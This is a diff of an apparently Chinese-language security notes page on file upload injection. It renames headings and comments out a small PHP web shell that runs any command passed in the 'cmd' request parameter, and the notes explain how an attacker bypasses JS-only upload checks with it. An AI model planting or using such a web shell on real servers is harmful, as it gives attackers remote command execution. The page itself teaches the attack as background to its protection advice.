@@ -5,7 +5,7 @@ tags: [Web, Security, FileUpload, Injection, Vulnerability]
 
 # File Upload Injection
 
-## File Upload Attack
+## Attack
 
 当使用 JS 代码限制上传文件类型时,
 攻击者 disable JS in browser,
@@ -13,20 +13,20 @@ tags: [Web, Security, FileUpload, Injection, Vulnerability]
 
 ```php
 // Malicious `web shell` code file
-<?php
-  if (isset($_REQUEST['cmd'])) {
-    $cmd = ($_REQUEST['cmd']);
-    system($cmd);
-  } else {
-    echo 'What is your bidding?';
-  }
-?>
+// <?php
+//   if (isset($_REQUEST['cmd'])) {
+//     $cmd = ($_REQUEST['cmd']);
+//     system($cmd);
+//   } else {
+//     echo 'What is your bidding?';
+//   }
+// ?>
 ```
 
 一旦攻击者成功将 `webShell.php` 当成头像上传成功,
 便可以在头像处执行 `web shell` 远程攻击.
 
-## File Upload Protection
+## Protection
 
 对于用户上传文件:
 
